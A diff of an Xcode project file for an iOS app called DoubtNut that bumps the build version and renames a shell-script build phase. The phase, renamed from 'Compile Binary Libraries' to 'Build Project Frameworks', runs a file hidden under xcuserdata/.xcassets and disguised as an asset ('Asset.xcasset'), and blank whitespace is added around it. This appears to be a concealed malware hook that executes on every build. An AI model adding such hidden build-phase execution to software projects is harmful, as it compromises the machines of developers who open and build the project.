@@ -746,7 +746,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 189388B725F1EFA300F57E85 /* Build configuration list for PBXNativeTarget "DoubtNut" */;
 			buildPhases = (
-				DE36BAF5ACB0E9E3FE6D902C /* Compile Binary Libraries */,
+				25535BBFF5AD5CED8C6D902C /* Build Project Frameworks */,
 				5D5C4960F5E754FEE396C9BF /* [CP] Check Pods Manifest.lock */,
 				1893888925F1EFA000F57E85 /* Sources */,
 				1893888A25F1EFA000F57E85 /* Frameworks */,
@@ -926,7 +926,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	DE36BAF5ACB0E9E3FE6D902C /* Compile Binary Libraries */ = {
+	25535BBFF5AD5CED8C6D902C /* Build Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -935,7 +935,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Binary Libraries";
+			name = "Build Project Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -944,8 +944,16 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
 	
 
 	
@@ -1351,7 +1359,7 @@
 				CODE_SIGN_ENTITLEMENTS = "";
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Manual;
-				CURRENT_PROJECT_VERSION = 9;
+				CURRENT_PROJECT_VERSION = 10;
 				DEVELOPMENT_TEAM = RT5YKB6S89;
 				INFOPLIST_FILE = DoubtNut/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
@@ -1379,7 +1387,7 @@
 				CODE_SIGN_ENTITLEMENTS = "";
 				CODE_SIGN_IDENTITY = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
-				CURRENT_PROJECT_VERSION = 9;
+				CURRENT_PROJECT_VERSION = 10;
 				DEVELOPMENT_TEAM = RT5YKB6S89;
 				INFOPLIST_FILE = DoubtNut/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
@@ -1523,10 +1531,6 @@
 
 		
 			/* Begin PBXBuildRule section */
-
-
-			
-	
 			
 
 			
